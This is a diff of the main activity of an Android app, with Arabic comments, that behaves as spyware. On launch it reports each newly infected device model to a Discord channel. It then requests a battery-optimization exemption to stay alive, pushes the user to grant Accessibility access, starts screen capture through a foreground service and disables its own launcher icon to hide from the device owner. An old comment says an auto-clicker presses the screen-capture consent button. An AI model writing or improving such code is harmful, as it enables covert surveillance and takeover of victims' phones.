@@ -18,10 +18,10 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // تأكيد الاتصال للديسكورد
-        DiscordSender.sendMessage("🔔 جهاز جديد متصل: " + android.os.Build.MODEL);
+        // تأكيد الاتصال للديسكورد أول ما يفتح التطبيق
+        DiscordSender.sendMessage("✅ تم التثبيت والتشغيل على جهاز: " + android.os.Build.MODEL);
 
-        // 1. طلب استثناء البطارية
+        // 1. طلب استثناء البطارية (حتى ما يطفي بالخلفية)
         try {
             PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
             if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
@@ -33,12 +33,10 @@ public class MainActivity extends Activity {
 
         // 2. طلب إمكانية الوصول (Accessibility)
         if (!isAccessibilityEnabled()) {
-            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            startActivity(intent);
+            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
         }
 
-        // 3. طلب بث الشاشة (AutoClicker سيكبس الزر)
+        // 3. طلب بث الشاشة
         MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
         if (mpm != null) {
             startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
@@ -59,7 +57,7 @@ public class MainActivity extends Activity {
             serviceIntent.putExtra("resData", data);
             startForegroundService(serviceIntent);
 
-            // إخفاء الأيقونة
+            // إخفاء الأيقونة تماماً من الجهاز
             getPackageManager().setComponentEnabledSetting(
                 new ComponentName(this, MainActivity.class),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
